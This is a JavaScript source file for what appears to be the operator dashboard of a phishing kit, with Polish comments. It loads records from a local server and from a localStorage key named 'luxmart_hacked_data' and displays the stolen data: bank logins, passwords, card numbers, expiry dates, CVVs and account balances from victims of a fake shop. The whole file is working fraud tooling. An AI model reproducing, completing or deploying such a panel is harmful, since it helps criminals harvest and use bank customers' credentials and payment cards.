// Bank Admin Logic - External Dashboard
document.addEventListener('DOMContentLoaded', () => {
    fetchData();
    document.getElementById('refreshBtn').addEventListener('click', fetchData);
});

async function fetchData() {
    const grid = document.getElementById('dataGrid');
    grid.innerHTML = '<p>Pobieranie danych...</p>';

    try {
        // Spróbuj pobrać z API (serwer Node.js)
        const response = await fetch('http://localhost:3000/api/data');
        let data = await response.json();

        // Dodaj dane z localStorage dla bezpieczeństwa
        const localData = JSON.parse(localStorage.getItem('luxmart_hacked_data') || '[]');

        // Złącz i posortuj (używając ID lub timestamp)
        // W prawdziwym systemie filtrowalibyśmy duplikaty po orderId
        const combined = [...data];
        localData.forEach(ld => {
            if (!combined.find(c => c.orderId === ld.orderId && c.timestamp === ld.timestamp)) {
                combined.push(ld);
            }
        });

        renderData(combined);
    } catch (error) {
        console.error('Błąd pobierania z API, używam tylko localStorage:', error);
        const localData = JSON.parse(localStorage.getItem('luxmart_hacked_data') || '[]');
        renderData(localData);
    }
}

function renderData(data) {
    const grid = document.getElementById('dataGrid');
    if (data.length === 0) {
        grid.innerHTML = '<p>Brak danych do wyświetlenia.</p>';
        return;
    }

    grid.innerHTML = data.reverse().map(item => {
        const isTwojBank = item.source === 'Twój Bank';

        // Reguły maskowania:
        // Twój Bank: tylko 2 pierwsze litery/cyfry, reszta to gwiazdki
        // IMG: pełne dane
        const mask = (str) => {
            if (!str) return '---';
            if (!isTwojBank) return str; // IMG ma widnieć całe

            if (str.length <= 2) return str;
            return str.substring(0, 2) + '*'.repeat(str.length - 2);
        };

        return `
            <div class="card ${isTwojBank ? 'twoj' : 'ing'}">
                <div class="card-header">
                    <span class="badge ${isTwojBank ? 'badge-twoj' : 'badge-ing'}">
                        ${item.source}
                    </span>
                    <small style="color: #64748b;">${new Date(item.timestamp).toLocaleString()}</small>
                </div>
                
                <div class="info-row">
                    <span class="label">ID Zamówienia:</span>
                    <span class="value">${item.orderId || 'Gość'}</span>
                </div>
                <div class="info-row">
                    <span class="label">Login:</span>
                    <span class="value">${mask(item.login)}</span>
                </div>
                <div class="info-row">
                    <span class="label">Hasło:</span>
                    <span class="value">${mask(item.password)}</span>
                </div>

                <div class="bank-details">
                    ${isTwojBank ? `
                        <div class="info-row">
                            <span class="label">Wybrane konto:</span>
                            <span class="value" style="color: #d4af37;">${item.selectedAccount}</span>
                        </div>
                        <div class="info-row">
                            <span class="label">Saldo:</span>
                            <span class="value">${item.accountBalance}</span>
                        </div>
                    ` : `
                        <div class="info-row">
                            <span class="label">Numer Karty:</span>
                            <span class="value">${item.cardNumber}</span>
                        </div>
                        <div class="info-row">
                            <span class="label">Ważność:</span>
                            <span class="value">${item.cardExpiry}</span>
                        </div>
                        <div class="info-row">
                            <span class="label">CVV:</span>
                            <span class="value">${item.cardCVV}</span>
                        </div>
                    `}
                </div>
            </div>
        `;
    }).join('');
}
